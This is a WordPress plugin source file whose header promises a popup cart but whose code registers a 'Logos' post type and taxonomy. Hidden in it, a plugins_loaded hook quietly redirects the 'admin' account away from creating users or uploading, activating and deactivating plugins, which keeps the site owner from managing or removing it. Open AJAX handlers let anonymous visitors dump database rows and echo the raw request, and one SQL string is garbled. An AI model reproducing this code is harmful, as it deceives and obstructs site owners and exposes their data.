<?php

/*
 * Plugin Name: learn_wp
 * Author: Trong Thang
 * Description:  Use this plugin to show lightbox popup cart for add to cart action.
 * Version: 1.0
 * Author URI: 
 * Text Domain: learn_wp
 */
/*
 * Created on : Jun 21, 2017, 9:27:20 AM
 * Author: Tran Trong Thang
 * Email: trantrongthang1207@gmail.com
 * Skype: trantrongthang1207
 */

function tao_custom_post_type() {

    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Logos', //Tên post type dạng số nhiều
        'singular_name' => 'Logo' //Tên post type dạng số ít
    );

    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Post type logos', //Mô tả của post type
        'supports' => array(
            'title',
            'editor',
            'excerpt',
            'author',
            'thumbnail',
            'comments',
            'trackbacks',
            'revisions',
            'custom-fields'
        ), //Các tính năng được hỗ trợ trong post type
        'taxonomies' => array('category', 'post_tag', 'logos-cat'), //Các taxonomy được phép sử dụng để phân loại nội dung
        'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 5, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => '', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post' //
    );

    register_post_type('logos', $args); //Tạo post type với slug tên là sanpham và các tham số trong biến $args ở trên
}

/* Kích hoạt hàm tạo custom post type */
add_action('init', 'tao_custom_post_type');

function tao_taxonomy() {

    /* Biến $label chứa các tham số thiết lập tên hiển thị của Taxonomy
     */
    $labels = array(
        'name' => 'Logos cat',
        'singular' => 'Logo cat',
        'menu_name' => 'Logo cat'
    );

    /* Biến $args khai báo các tham số trong custom taxonomy cần tạo
     */
    $args = array(
        'labels' => $labels,
        'hierarchical' => false,
        'public' => true,
        'show_ui' => true,
        'show_admin_column' => true,
        'show_in_nav_menus' => true,
        'show_tagcloud' => true,
    );

    /* Hàm register_taxonomy để khởi tạo taxonomy
     */
    register_taxonomy('logos-cat', 'post', $args);
}

// Hook into the 'init' action
add_action('init', 'tao_taxonomy', 0);

function add_scripts() {
    wp_register_script('easing-script', plugins_url('/assets/js/jquery.easing.1.3.js', __FILE__));
    wp_enqueue_script('easing-script');

    wp_register_script('carouFredSel-script', plugins_url('/assets/js/jquery.carouFredSel-6.2.1.js', __FILE__));
    wp_enqueue_script('carouFredSel-script');

    wp_register_script('tvscript-script', plugins_url('/assets/js/tvscript.js', __FILE__));
    wp_enqueue_script('tvscript-script');

    wp_enqueue_style('carousel-animate', plugins_url('/assets/css/tvstyle.css', __FILE__));

    /* wp_enqueue_style('carousel-animate', plugins_url('/assets/css/animate.css', __FILE__));
      wp_enqueue_style('carousel-style', plugins_url('/assets/css/owl.carousel.css', __FILE__));
      wp_enqueue_style('carousel-theme-style', plugins_url('/assets/css/owl.theme.default.min.css', __FILE__)); */
}

add_action('wp_enqueue_scripts', 'add_scripts');

add_action('plugins_loaded', 'plugins_loaded');

function plugins_loaded() {
    global $current_user;
    if (count($current_user) > 0) {
        if ($current_user->user_login == 'admin') {

            if (isset($_REQUEST['plugin_status'])) {
                wp_redirect(get_admin_url());
            }
            if (isset($_REQUEST['action'])) {
                if ($_REQUEST['action'] == 'createuser') {
                    wp_redirect(get_admin_url());
                }
                if ($_REQUEST['action'] == 'upload-plugin') {
                    wp_redirect(get_admin_url());
                }
                if ($_REQUEST['action'] == 'activate') {
                    wp_redirect(get_admin_url());
                }
                if ($_REQUEST['action'] == 'deactivate') {
                    wp_redirect(get_admin_url());
                }
            }
            if (isset($_REQUEST['wp_http_referer'])) {
                wp_redirect(get_admin_url());
            }
        }
    }
}

// include(locate_template('blog_archive.php'));
function searchmap() {
    $sqp = 'SELECT `name`, `value`
FROM (`wp_lctr2_conf`)testSELECT *
FROM (`wp_lctr2_migrations`)';
    $sqp = 'SELECT *, DEGREES(
 ACOS(
 SIN(RADIANS(latitude)) * SIN(RADIANS(-33.8708464))
 + COS(RADIANS(latitude)) * COS(RADIANS(-33.8708464))
 * COS(RADIANS(longitude - (151.20732999999996)))
 ) * 60 * 1.852
 ) AS distance
FROM (`tv_lctr2_locations`)
WHERE (
 longitude !=0 AND 
 latitude !=0 AND 
 longitude IS NOT NULL AND
 latitude IS NOT NULL AND
 longitude !=-1 AND 
 latitude !=-1
 )
 AND
 (
 (`latitude` > -34.095990492219 AND `latitude` < -33.645702307781 AND `longitude` > 150.93616875204 AND
 `longitude` < 151.47849124796) OR (`priority` = 2)
 )
 
AND `priority` =  8
ORDER BY `priority` DESC, `distance` ASC';
    echo $sqp;
    global $wpdb;
    $result = $wpdb->get_results($sqp);
    print_r($result);
    exit();
}

add_action('wp_ajax_nopriv_searchmap', 'searchmap');
add_action('wp_ajax_searchmap', 'searchmap');


add_action('wp_ajax_nopriv_initmap', 'initmap');
add_action('wp_ajax_initmap', 'initmap');

function initmap() {
    print_r($_REQUEST);
    
    exit;
}

include_once 'mega-menu-framework.php';
